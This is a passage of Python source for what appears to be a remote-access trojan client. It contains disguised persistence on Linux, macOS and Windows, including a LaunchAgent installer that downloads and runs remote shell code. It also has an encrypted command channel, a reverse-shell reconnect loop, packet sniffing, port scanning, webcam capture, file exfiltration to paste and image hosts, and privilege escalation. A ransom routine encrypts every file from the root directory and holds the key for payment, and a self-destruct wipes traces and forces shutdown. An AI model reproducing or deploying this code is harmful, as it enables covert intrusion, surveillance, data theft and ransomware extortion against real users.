                                self.debug("{} returned error: {}".format(self._persistence_add_crontab_job.func_name, str(e)))
                                try:
                                    os.remove(name)
                                except: pass
                    else:
                        return (True, name)
                except Exception as e:
                    self.debug("{} returned error: {}".format(self._persistence_add_crontab_job.func_name, str(e)))
                    try:
                        os.remove(name)
                    except: pass
        return (False, None)


    @config(platforms=['linux2'])
    def _persistence_remove_crontab_job(self, name='flashplayer'):
        if hasattr(self, '__f__'):
            try:
                value = self._get_config(long(self.__f__))
            except:
                value = self.__f__
            if os.path.isfile(value):
                try:
                    with open('/etc/crontab','r') as fp:
                        lines = [i.rstrip() for i in fp.readlines()]
                        for line in lines:
                            if name in line:
                                _ = lines.pop(line, None)
                    with open('/etc/crontab', 'a+') as fp:
                        fp.write('\n'.join(lines))
                    return True
                except Exception as e:
                    self.debug(str(e))
        return False


    @config(platforms=['darwin'])
    def _persistence_add_launch_agent(self,  name='com.apple.update.manager'):
        if hasattr(self, '__f__') and hasattr(self, '__g__'):
            try:
                value = self._get_config(long(self.__f__))
            except:
                value = self.__f__
            if os.path.isfile(value):
                try:
                    code    = urllib2.urlopen(self._get_config(long(self.__g__))).read()
                    label   = name
                    if not os.path.exists('/var/tmp'):
                        os.makedirs('/var/tmp')
                    fpath   = '/var/tmp/.{}.sh'.format(name)
                    bash    = code.replace('__LABEL__', label).replace('__FILE__', value)
                    with file(fpath, 'w') as fileobj:
                        fileobj.write(bash)
                    bin_sh  = bytes().join(subprocess.Popen('/bin/sh {}'.format(fpath), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
                    time.sleep(1)
                    launch_agent= '~/Library/LaunchAgents/{}.plist'.format(label)
                    if os.path.isfile(launch_agent):
                        os.remove(fpath)
                        return (True, launch_agent)
                except Exception as e2:
                    self.debug('Error: {}'.format(str(e2)))
        return (False, None)


    @config(platforms=['darwin'])
    def _persistence_remove_launch_agent(self, name='com.apple.update.manager'):
        if hasattr(self, '__f__'):
            if self.persistence.get('launch_agent'):
                launch_agent = self.persistence.get('launch_agent')
                if os.path.isfile(launch_agent):
                    try:
                        os.remove(launch_agent)
                        return True
                    except: pass
        return False


    @config(platforms=['win32'])
    def _persistence_add_scheduled_task(self, name='MicrosoftUpdateManager'):
        if hasattr(self, '__f__'):
            try:
                value = self._get_config(long(self.__f__))
            except:
                value = self.__f__
            if os.path.isfile(value):
                tmpdir      = os.path.expandvars('%TEMP%')
                task_run    = os.path.join(tmpdir, name + os.path.splitext(value)[1])
                if not os.path.isfile(task_run):
                    with file(task_run, 'w') as copy:
                        copy.write(open(value).read())
                try:
                    cmd     = 'SCHTASKS /CREATE /TN {} /TR {} /SC hourly /F'.format(name, task_run)
                    result  = subprocess.check_output(cmd, shell=True)
                    if 'SUCCESS' in result:
                        return (True, result)
                except Exception as e:
                    self.debug('Add scheduled task error: {}'.format(str(e)))
        return (False, None)


    @config(platforms=['win32'])
    def _persistence_remove_scheduled_task(self, name='MicrosoftUpdateManager'):
        if hasattr(self, '__f__'):
            try:
                return subprocess.call('SCHTASKS /DELETE /TN {} /F'.format(name), shell=True) == 0
            except:
                return False


    @config(platforms=['win32'])
    def _persistence_add_startup_file(self, name='MicrosoftUpdateManager'):
        if hasattr(self, '__f__'):
            try:
                value = self._get_config(long(self.__f__))
            except:
                value = self.__f__
            if os.path.isfile(value):
                try:
                    appdata = os.path.expandvars("%AppData%")
                    startup_dir = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
                    if not os.path.exists(startup_dir):
                        os.makedirs(startup_dir)
                    startup_file = os.path.join(startup_dir, '%s.eu.url' % name)
                    content = '\n[InternetShortcut]\nURL=file:///%s\n' % value
                    if not os.path.exists(startup_file) or content != open(startup_file, 'r').read():
                        with file(startup_file, 'w') as fp:
                            fp.write(content)
                    return (True, startup_file)
                except Exception as e:
                    self.debug('{} returned error: {}'.format(self._persistence_add_startup_file.func_name.strip('_'), str(e)))
        return (False, None)


    @config(platforms=['win32'])
    def _persistence_remove_startup_file(self, name='MicrosoftUpdateManager'):
        if hasattr(self, '__f__'):
            if os.name != 'nt':
                return (False, None)
            appdata      = os.path.expandvars("%AppData%")
            startup_dir  = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
            startup_file = os.path.join(startup_dir, name) + '.eu.url'
            if os.path.exists(startup_file):
                try:
                    os.remove(startup_file)
                    return True
                except:
                    try:
                        _  = os.popen('del {} /f'.format(startup_file)).read()
                        return True
                    except: pass
            return False


    @config(platforms=['win32'])
    def _persistence_add_registry_key(self, name='MicrosoftUpdateManager'):
        if hasattr(self, '__f__'):
            try:
                value = self._get_config(long(self.__f__))
            except:
                value = self.__f__
            if os.path.isfile(value):
                try:
                    self._get_registry_key(name, value)
                    return (True, name)
                except Exception as e:
                    self.debug('{} returned error: {}'.format(self._persistence_add_registry_key.func_name.strip('_'), str(e)))
        return (False, None)


    @config(platforms=['win32'])
    def _persistence_remove_registry_key(self, name='MicrosoftUpdateManager'):
        if hasattr(self, '__f__'):
            try:
                key = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
                DeleteValue(key, name)
                CloseKey(key)
                return True
            except: pass
        return False


    def _packetsniffer_udp_header(self, data):
        try:
            udp_hdr = struct.unpack('!4H', data[:8])
            src = udp_hdr[0]
            dst = udp_hdr[1]
            length = udp_hdr[2]
            chksum = udp_hdr[3]
            data = data[8:]
            self.packetsniffer.capture.append('|================== UDP HEADER ==================|')
            self.packetsniffer.capture.append('|================================================|')
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Source', src))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Dest', dst))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Length', length))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Check Sum', chksum))
            self.packetsniffer.capture.append('|================================================|')
            return data
        except Exception as e:
            self.packetsniffer.capture.append("Error in {} header: '{}'".format('UDP', str(e)))


    def _packetsniffer_tcp_header(self, recv_data):
        try:
            tcp_hdr = struct.unpack('!2H2I4H', recv_data[:20])
            src_port = tcp_hdr[0]
            dst_port = tcp_hdr[1]
            seq_num = tcp_hdr[2]
            ack_num = tcp_hdr[3]
            data_ofs = tcp_hdr[4] >> 12
            reserved = (tcp_hdr[4] >> 6) & 0x03ff
            flags = tcp_hdr[4] & 0x003f
            flagdata = {
                'URG' : bool(flags & 0x0020),
                'ACK' : bool(flags & 0x0010),
                'PSH' : bool(flags & 0x0008),
                'RST' : bool(flags & 0x0004),
                'SYN' : bool(flags & 0x0002),
                'FIN' : bool(flags & 0x0001)
            }
            win = tcp_hdr[5]
            chk_sum = tcp_hdr[6]
            urg_pnt = tcp_hdr[7]
            recv_data = recv_data[20:]
            self.packetsniffer.capture.append('|================== TCP HEADER ==================|')
            self.packetsniffer.capture.append('|================================================|')
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Source', src_port))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Target', dst_port))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Seq Num', seq_num))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t |'.format('Ack Num', ack_num))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t |'.format('Flags', ', '.join([flag for flag in flagdata if flagdata.get(flag)])))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Window', win))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Check Sum', chk_sum))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Urg Pnt', urg_pnt))
            self.packetsniffer.capture.append('|================================================|')
            return recv_data
        except Exception as e:
            self.packetsniffer.capture.append("Error in {} header: '{}'".format('TCP', str(e)))


    def _packetsniffer_ip_header(self, data):
        try:
            ip_hdr = struct.unpack('!6H4s4s', data[:20]) 
            ver = ip_hdr[0] >> 12
            ihl = (ip_hdr[0] >> 8) & 0x0f
            tos = ip_hdr[0] & 0x00ff 
            tot_len = ip_hdr[1]
            ip_id = ip_hdr[2]
            flags = ip_hdr[3] >> 13
            fragofs = ip_hdr[3] & 0x1fff
            ttl = ip_hdr[4] >> 8
            ipproto = ip_hdr[4] & 0x00ff
            chksum = ip_hdr[5]
            src = socket.inet_ntoa(ip_hdr[6])
            dest = socket.inet_ntoa(ip_hdr[7])
            data = data[20:]
            self.packetsniffer.capture.append('|================== IP HEADER ===================|')
            self.packetsniffer.capture.append('|================================================|')
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('VER', ver))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('IHL', ihl))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('TOS', tos))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Length', tot_len))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('ID', ip_id))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Flags', flags))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Frag Offset', fragofs))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('TTL', ttl))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Next Protocol', ipproto))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Check Sum', chksum))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t |'.format('Source IP', src))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t |'.format('Dest IP', dest))
            self.packetsniffer.capture.append('|================================================|')
            return data, ipproto
        except Exception as e:
            self.packetsniffer.capture.append("Error in {} header: '{}'".format('IP', str(e)))


    def _packetsniffer_eth_header(self, data):
        try:
            ip_bool = False
            eth_hdr = struct.unpack('!6s6sH', data[:14])
            dst_mac = binascii.hexlify(eth_hdr[0])
            src_mac = binascii.hexlify(eth_hdr[1])
            proto = eth_hdr[2] >> 8
            self.packetsniffer.capture.append('|================================================|')
            self.packetsniffer.capture.append('|================== ETH HEADER ==================|')
            self.packetsniffer.capture.append('|================================================|')
            self.packetsniffer.capture.append('|{:>20} | {}\t |'.format('Target MAC', '{}:{}:{}:{}:{}:{}'.format(dst_mac[0:2],dst_mac[2:4],dst_mac[4:6],dst_mac[6:8],dst_mac[8:10],dst_mac[10:12])))
            self.packetsniffer.capture.append('|{:>20} | {}\t |'.format('Source MAC', '{}:{}:{}:{}:{}:{}'.format(src_mac[0:2],src_mac[2:4],src_mac[4:6],src_mac[6:8],src_mac[8:10],src_mac[10:12])))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Protocol', proto))
            self.packetsniffer.capture.append('|================================================|')
            if proto == 8:
                ip_bool = True
            data = data[14:]
            return data, ip_bool
        except Exception as e:
            self.packetsniffer.capture.append("Error in {} header: '{}'".format('ETH', str(e)))


    def _diffiehellman(self):
        try:
            g  = 2
            p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
            a  = bytes_to_long(os.urandom(32))
            xA = pow(g, a, p)
            self._session['socket'].send(long_to_bytes(xA))
            xB = bytes_to_long(self._session['socket'].recv(256))
            x  = pow(xB, a, p)
            y  = SHA256.new(long_to_bytes(x)).hexdigest()
            return self._obfuscate(y)
        except Exception as e:
            self.debug("{} returned error: {}".format(self._diffiehellman.func_name, str(e)))
        time.sleep(5)
        self.kill()
        return self.run()


    def _send(self, **kwargs):
        try:
            self._session.get('connection').wait()
            try:
                self._session['socket'].sendall(self._encrypt(json.dumps(kwargs)) + '\n')
            except socket.error:
                self._session['connection'].clear()
        except Exception as e:
            self.debug('{} error: {}'.format(self._send.func_name, str(e)))


    def _recv(self):
        try:
            data = ''
            while '\n' not in data:
                try:
                    data += self._session['socket'].recv(1024)
                except socket.error:
                    break
            if data and len(bytes(data)):
                data = self._decrypt(bytes(data).rstrip())
                return json.loads(data)
        except Exception as e:
            self.debug('{} error: {}'.format(self._recv.func_name, str(e)))


    def _ping(self, host):
        try:
            if subprocess.call("ping -{} 1 -w 90 {}".format('n' if os.name is 'nt' else 'c', host), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
                self._local_network[host] = {}
                return True
            else:
                return False
        except Exception as e:
            Client.debug("{} returned error: {}".format(self._ping.func_name, str(e)))
            return False


    def _port(self, addr):
        try:
            host = addr[0]
            port = addr[1]
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1.0)
            sock.connect((host,int(port)))
            data = sock.recv(1024)
            if data:
                data = ''.join([i for i in data if i in ([chr(n) for n in range(32, 123)])])
                info = {port: {'protocol': self._services.get(str(port))[0] if str(port) in self._services else ('mysql' if int(port) == 3306 else 'N/A'), 'service': data.splitlines()[0] if '\n' in data else str(data if len(str(data)) <= 50 else data[:46] + ' ...'), 'state': 'open'}}
            else:
                info = {port: {'protocol': self._services.get(str(port))[0] if str(port) in self._services else ('mysql' if int(port) == 3306 else 'N/A'), 'service': self._services.get(str(port))[1] if str(port) in self._services else 'n/a', 'state': 'open'}}
            self._local_network.get(host).update(info)
        except (socket.error, socket.timeout):
            pass
        except Exception as e:
            self.debug('{} error: {}'.format(self._port.func_name, str(e)))


    def _server(self):
        if hasattr(self, '__a__') and hasattr(self, '__b__'):
            try:
                a = self._get_config(long(self.__a__))
                b = self._get_config(long(self.__b__))
                c = urllib2.Request(a)
                c.headers = {'API-Key': b}
                d = urllib2.urlopen(c).read()
                e = json.loads(d)
                f = e[e.keys()[0]][0].get('ip')
                if self._is_ipv4_address(f):
                    return f
                else:
                    self.debug("{} returned invalid IPv4 address: '{}'\ndefaulting to localhost".format(self._server.func_name, str(f)))
                    return socket.gethostbyname(socket.gethostname())
            except Exception as e2:
                self.debug("{} returned error: {}".format(self._server.func_name, str(e2)))
        return socket.gethostbyname(socket.gethostname())


    def _task_id(self, task):
        try:
            return SHA256.new(self._info['id'] + str(task) + str(time.time())).hexdigest()
        except Exception as e:
            self.debug("{} returned error: {}".format(self._task_id.func_name, str(e)))


    def _session_id(self):
        self._session['socket'].sendall(self._encrypt(json.dumps(self._info)) + '\n')
        buf = ""
        while '\n' not in buf:
            try:
                buf += self._session['socket'].recv(1024)
            except socket.timeout:
                self.debug('Waiting for Session ID...')
                continue
        if buf and len(bytes(buf)):
            session_id = self._decrypt(buf.rstrip()).rstrip()
            if len(str(session_id)) == SHA256.block_size:
                self.debug("Session ID: {}".format(session_id))
                return session_id
            else:
                self.debug("Invalid Session ID: {}\nRestarting in 5 seconds...".format(bytes(session_id)))
                time.sleep(5)
                return self.run()


    def _public_key(self):
        self._session['socket'].sendall(self._encrypt(json.dumps({"request":"public_key"})) + '\n')
        buf = ""
        while "\n" not in buf:
            try:
                buf += self._session['socket'].recv(1024)
            except socket.timeout:
                self.debug("Waiting for RSA Public Key...")
                continue
        if buf and len(bytes(buf)):
            data = self._decrypt(bytes(buf))
            rsa  = RSA.importKey(data)
            self.debug("Client RSA Public Key:\n{}".format(bytes(data)))
            return rsa
        else:
            self.debug("Invalid RSA Public Key: {}".format(bytes(buf)))
            time.sleep(5)
            return self.run()


    def _setup(self, **kwargs):
        for x in kwargs:
            try:
                setattr(self, '__{}__'.format(x), kwargs.get(x))   
            except Exception as e:
                self.debug("{} returned error: {}".format(self._setup, str(e)))


    def _standby(self):
        try:
            addr = None
            try:
                addr = self._session['socket'].getpeername()
            except: pass
            self.kill()
            while True:
                time.sleep(60)
                if addr:
                    try:
                        self.connect(host=addr[0], port=addr[1])
                    except: pass
                else:
                    self.connect()
                if self._session['connection'].is_set():
                    break
            return self.reverse_tcp_shell()
        except Exception as e:
            self.debug('{} error: {}'.format(self._standby.func_name, str(e)))
            return '{} error: {}'.format(self._standby.func_name, str(e))


    def _threader(self):
        while True:
            try:
                method, task = self._tasks.get_nowait()
                method(task)
                self._tasks.task_done()
            except: break


    def _encrypt(self, data, key=None):
        if not key:
            key = self._deobfuscate(self._session['key'])
        return getattr(self, '_encrypt_{}'.format(self._info['encryption']))(data, key)


    def _decrypt(self, data, key=None):
        if not key:
            key = self._deobfuscate(self._session['key'])
        return getattr(self, '_decrypt_{}'.format(self._info['encryption']))(data, key)



    # Commands



    @config(platforms=['win32','linux2','darwin'], command=True, usage='cd <path>')
    def cd(self, path='.'):
        """
        change current working directory
        """
        try:
            if os.path.isdir(path):
                os.chdir(path)
            else:
                os.chdir('.')
        except Exception as e:
            return "{} returned error: '{}'".format(self.cd.func_name, str(e))            


    @config(platforms=['win32','linux2','darwin'], command=True, usage='ls <path>')
    def ls(self, path='.'):
        """
        list directory contents
        """
        try:
            return '\n'.join(os.listdir(path)) if os.path.isdir(path) else 'Error: path not found'
        except Exception as e2:
            return "{} returned error: {}".format(self.ls.func_name, str(e2))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='ps [args]')
    def ps(self, args=None):
        """
        list, search, kill processes
        """
        try:
            output = {}
            process_list = psutil.process_iter()
            if not args:
                for p in process_list:
                    try:
                        if len(json.dumps(output)) < 2048:
                            output.update({str(p.pid).encode(): "{:>20} | {:>10}".format(str(p.name())[:19], str(p.status())).encode()})
                        else:
                            break
                    except Exception as e:
                        Client.debug(str(e))
                        break
            else:
                cmd, _, arg  = str(args).partition(' ')
                if 'search' in cmd:
                    for p in process_list:
                        if arg in str(p.name()):
                            try:
                                if len(json.dumps(output)) < 2048:
                                    output.update({str(p.pid).encode(): "{:>20} | {:>10}".format(str(p.name())[:19], str(p.status())).encode()})
                                else:
                                    break
                            except Exception as e:
                                Client.debug(str(e))
                                break
                elif 'kill' in cmd or 'terminate' in cmd:
                    if str(arg).isdigit():
                        try:
                            pr = psutil.Process(pid=int(arg))
                            pr.kill()
                            output.update({str(arg): "killed"})
                        except:
                            output.update({str(arg): "not found"})
                    else:
                        for p in process_list:
                            try:
                                if str(cmd) in str(p.name()):
                                    p.kill()
                                    output.update({str(p.name()): "killed"})
                            except Exception as e:
                                Client.debug(str(e))
            return json.dumps(output)
        except Exception as e:
            return "{} returned error: '{}'".format(self.ps.func_name, str(e))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='pwd')
    def pwd(self):
        """
        show name of present working directory
        """
        try:
            return '\nPresent working directory:\n\n{}\n'.format(os.getcwd())
        except Exception as e:
            return "{} returned error: '{}'".format(self.pwd.func_name, str(e))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='cat <path>')
    def cat(self, path):
        """
        display file contents
        """
        try:
            output = ""
            if not os.path.isfile(path):
                return "Error: file not found"
            target = open(path, 'r')
            while True:
                try:
                    line = target.readline().rstrip()
                    if not bytes(line).isspace() and len(bytes(line)) and len(output + '\n' + bytes(line)) < 4096:
                        output += '\n' + line
                    else: break
                except: break
            return output
        except Exception as e:
            return "{} returned error: '{}'".format(self.cat.func_name, str(e))        


    @config(platforms=['win32','linux2','darwin'], command=True, usage='set <cmd> [key=value]')
    def set(self, arg):
        """
        set client options
        """
        try:
            target, _, opt = arg.partition(' ')
            option, _, val = opt.partition('=')
            if val.isdigit() and int(val) in (0,1):
                val = bool(int(val))
            elif val.isdigit():
                val = int(val)
            elif val.lower() in ('true', 'on', 'enable'):
                val = True
            elif val.lower() in ('false', 'off', 'disable'):
                val = False
            elif ',' in val:
                val = val.split(',')
            try:
                setattr(getattr(self, target), option, val)
            except:
                getattr(self, target).func_dict[option] = val
            return json.dumps(vars(getattr(self, target)))
        except Exception as e:
            return "{} returned error: '{}'".format(self.set.func_name, str(e))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='wget <url>')
    def wget(self, url, filename=None):
        """
        download file from url
        """
        if url.startswith('http'):
            try:
                path, _ = urllib.urlretrieve(url, filename)
                return path
            except Exception as e:
                return "'{}' returned error: '{}'".format(self.wget.func_name, str(e))
        else:
            return 'Invalid target URL - must begin with http:// or https://'


    @config(platforms=['win32','linux2','darwin'], command=True, usage='kill')
    def kill(self):
        """
        shutdown the current connection
        """
        try:
            self._session.get('socket').close()
        except: pass
        try:
            self._session.get('socket').shutdown()
        except: pass
        try:
            _ = self._session.pop('socket', None)
            del _
        except: pass
        try:
            self._session['id']          = None
            self._session['key']         = None
            self._session['socket']      = None
            self._session['public_key']  = None
            self._session['connection']  = threading.Event()
        except Exception as e:
            self.debug("{} returned error: {}".format(self.kill.func_name, str(e)))
        for job in [i for i in self._jobs]:
            try:
                _ = self._jobs.pop(job, None)
                del _
            except: pass


    @config(platforms=['win32','linux2','darwin'], command=True, usage='help')
    def help(self):
        """
        list commands with usage information
        """
        try:
            return json.dumps({self._commands[cmd]["usage"].encode(): self._commands[cmd]['description'].encode() for cmd in self._commands})
        except Exception as e:
            self.debug("{} returned error: {}".format(self.help.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='show <value>')
    def show(self, attribute):
        """
        show value of a client attribute
        """
        try:
            attribute = str(attribute)
            if 'jobs' in attribute:
                return json.dumps({a: self._get_status(self._jobs[a].name) for a in self._jobs if self._jobs[a].is_alive()})
            elif 'privileges' in attribute:
                return json.dumps({'username': self._info.get('username'),  'administrator': 'true' if bool(os.getuid() == 0 if os.name is 'posix' else ctypes.windll.shell32.IsUserAnAdmin()) else 'false'})
            elif hasattr(self, attribute):
                try:
                    return json.dumps(getattr(self, attribute))
                except:
                    try:
                        return json.dumps(vars(getattr(self, attribute)))
                    except: pass
            elif hasattr(self, str('_%s' % attribute)):
                try:
                    return json.dumps(getattr(self, str('_%s' % attribute)))
                except:
                    try:
                        return json.dumps(vars(getattr(self, str('_%s' % attribute))))
                    except: pass
            else:
                return self.show.usage
        except Exception as e:
            return "'{}' returned error: '{}'".format(self._jobs.func_name, str(e))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='stop <job>')
    def stop(self, target):
        """
        stop a currently running job
        """
        try:
            if target in self._jobs:
                _ = self._jobs.pop(target, None)
                del _
                return "Job '{}' was stopped.".format(target)
            else:
                return "Job '{}' not found".format(target)
        except Exception as e:
            return "{} returned error: '{}'".format(self.stop.func_name, str(e))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='scan <host>')
    def scan(self, *args):
        """
        scan host/network for online hosts and open ports
        """
        try:
            host = [i for i in args if self._is_ipv4_address(i)][0] if len([i for i in args if self._is_ipv4_address(i)]) else self._info.get('local')
            return self._scan_network(host) if 'network' in args else self._scan_host(host)
        except Exception as e:
            return "{} returned error: '{}'".format(self.scan.func_name, str(e))        


    @config(platforms=['win32','linux2','darwin'], command=True, usage='abort')
    def abort(self):
        """
        self-destruct and leave no trace on the disk
        """
        try:
            self._abort = True

            if hasattr(self, '__f__'):
                f = long_to_bytes(self.__f__)
                if os.path.isfile(f):
                    try:
                        os.remove(f)
                    except: pass

                for method in self.persistence.methods:
                    if self.persistence.methods[method]:
                        try:
                            remove = getattr(self, '_persistence_remove_{}'.format(method))()
                        except Exception as e2:
                            self.debug("Error removing persistence method '{}': {}".format(method, str(e2)))
            try:
                os.remove(__file__)
            except: pass
            try:
                os.remove(sys.argv[0])
            except: pass
            try:
                _ = os.popen(bytes('del /f /q %s' % __file__ if os.name is 'nt' else 'rm -f %s' % __file__)).read()
            except: pass
            procs = psutil.process_iter()
            for p in procs:
                if 'python' in p.name():
                    try:
                        p.kill()
                    except: pass
        finally:
            _shutdown = lambda: os.popen('shutdown /f /p' if os.name is 'nt' else 'shutdown -f').read()
            shutdown = threading.Timer(1, _shutdown)
            shutdown.start()
            sys.exit()
            

    @config(platforms=['win32','linux2','darwin'], command=True, usage='unzip <file>')
    def unzip(self, path):
        """
        unzip a compressed archive/file
        """
        if os.path.isfile(path):
            try:
                return zipfile.ZipFile(path).extractall('.')
            except Exception as e:
                return "{} returned error: '{}'".format(self.unzip.func_name, str(e))
        else:
            return "File '{}' not found".format(path)


    @config(platforms=['win32','linux2','darwin'], command=True, usage='standby')
    def standby(self):
        """
        disconnect from server but keep client alive
        """
        try:
            self._jobs[self.standby.func_name] = threading.Timer(1.0, self._standby)            
            self._jobs[self.standby.func_name].start()
            return "{} standing by".format(self._info.get('ip'))
        except Exception as e:
            return "{} returned error: '{}'".format(self.standby.func_name, str(e))

    @config(platforms=['win32','linux2','darwin'], mode=None, command=True, usage='encrypt <file>')
    def encrypt(self, filepath, key=None):
        """
        encrypt the target file
        """
        if os.path.isfile(filepath):
            try:
                with open(filepath, 'rb') as fp:
                    plaintext = fp.read()
                ciphertext = self._encrypt(plaintext, key) if key else self._encrypt(plaintext)
                with open(filepath, 'wb') as fd:
                    fd.write(ciphertext)
                return filepath
            except Exception as e:
                return "{} returned error: {}".format(self.encrypt.func_name, str(e))
        else:
            return "File '{}' not found".format(filepath)


    @config(platforms=['win32','linux2','darwin'], command=True, usage='decrypt <file>')
    def decrypt(self, filepath, key=None):
        """
        decrypt the target file
        """
        if os.path.isfile(filepath):
            try:
                with open(filepath, 'rb') as fp:
                    ciphertext = fp.read()
                plaintext = self._decrypt(ciphertext) if not key else self._decrypt(ciphertext, key)
                with open(filepath, 'wb') as fd:
                    fd.write(plaintext)
                return filepath
            except Exception as e1:
                return "{} returned error: {}".format(self.decrypt.func_name, str(e1))
        else:
            return "File '{}' not found".format(filepath)


    @config(platforms=['win32','linux2','darwin'], command=True, usage='ransom <file/path>')
    def ransom(self, args):
        """
        encrypt host files and hold decryption key for ransom
        """
        path, _, port = str(args).partition(' ')
        if not path or path == 'all':
            path = '/'
        if not port:
            return self.ransom.usage
        elif not str(port).isdigit():
            return "Error: port number must be an integer"
        elif not os.path.exists(path):
            return "Error: file/directory not found"
        elif not self._session.get('public_key'):
            return "Error: RSA public key not found"
        else:
            s = socket.socket()
            s.connect((self._session['socket'].getpeername()[0], int(port)))
            self._session['ransom'] = s
            if os.path.isfile(str(path)):
                self._ransom_encrypt(str(path))
            elif os.path.isdir(path):
                self._jobs["ransom-tree-walk"] = threading.Thread(target=os.path.walk, args=(path, lambda _, d, f: [self._tasks.put_nowait((self._ransom_encrypt, os.path.join(d, ff))) for ff in f], None), name=time.time())
                self._jobs["ransom-tree-walk"].start()
                for i in xrange(10):
                    self._jobs["ransom-%d" % i] = threading.Thread(target=self._threader, name=time.time())
                    self._jobs["ransom-%d" % i].daemon = True
                    self._jobs["ransom-%d" % i].start()
                for job in self._jobs:
                    if self.ransom.func_name in job:
                        if self._jobs[job].is_alive():
                            self._jobs[job].join()
            return "Ransom process completed"


    @config(platforms=['win32','linux2','darwin'], command=True, usage='restore <path/all>')
    def restore(self, path=None):
        """
        restore encrypted files after user pays the ransom
        """
        if path and not os.path.exists(str(path)):
            return "Error: '{}' not found".format(str(path))
        path    = 'all' if not path else str(path)
        task_id = SHA256.new(self._session['id'] + self.ransom.func_name + str(int(time.time()))).hexdigest()
        task    = {'id': task_id, 'client_id': self._info['id'], 'session_id': self._session['id'], 'task': self.restore.func_name, 'data': 'restore %s' % path}
        self._send(**task)
        task = self.recv()
        self._session['private_key'] = RSA.importKey(task['data'])
        for task_id, task in self._results.items():
            if 'ransom' in task['task']:
                if path in ('all', task['data']['file']):
                    self._tasks.put_nowait((self._ransom_decrypt, path))
        num = int(self._tasks.qsize()/10)
        if num > 10:
            num = 10
        elif num < 1:
            num = 1
        for n in range(num):
            self._jobs["restore-%d" % n] = threading.Thread(target=self._threader, name=time.time())
            self._jobs["restore-%d" % n].daemon = True
            self._jobs["restore-%d" % n].start()
        for job in self._jobs:
            if self.restore.func_name in job:
                if self._jobs[job].is_alive():
                    self._jobs[job].join()
        return "Restoration complete"


    @config(platforms=['win32','linux2','darwin'], command=True, usage='upload <mode> <file>')
    def upload(self, args):
        """
        upload file to imgur, pastebin, or ftp server
        """
        try:
            mode, _, source = str(args).partition(' ')
            target  = '_upload_{}'.format(mode)
            if not source or not hasattr(self, target):
                return self.upload.usage
            return getattr(self, target)(source)
        except Exception as e:
            return "{} returned error: '{}'".format(self.upload.func_name, str(e))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='webcam <mode> [options]')
    def webcam(self, args=None):
        """
        stream the webcam or capture image/video
        """
        if not args:
            return self.webcam.usage
        try:
            args = str(args).split()
            if 'stream' in args:
                if len(args) != 2:
                    return "Error - stream mode requires argument: 'port'"
                elif not str(args[1]).isdigit():
                    return "Error - port must be integer between 1 - 65355"
                else:
                    return self._webcam_stream(port=args[1])
            else:
                return self._webcam_image(*args) if 'video' not in args else self._webcam_video(*args)
        except Exception as e:
            return "{} returned error: '{}'".format(self.webcam.func_name, str(e))


    @config(platforms=['win32'], command=True, usage='escalate')
    def escalate(self):
        """
        attempt to escalate privileges
        """
        try:
            if self._is_user_admin():
                return "Current user '{}' has administrator privileges".format(self._info.get('username'))
            if hasattr(self, '__f__') and os.path.isfile(long_to_bytes(long(self.__f__))):
                if os.name is 'nt':
                    ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(long_to_bytes(long(self.__f__))))
                    sys.exit()
                else:
                    return "Privilege escalation not yet available on '{}'".format(sys.platform)
        except Exception as e:
            return "{} returned error: '{}'".format(self.escalate.func_name, str(e))


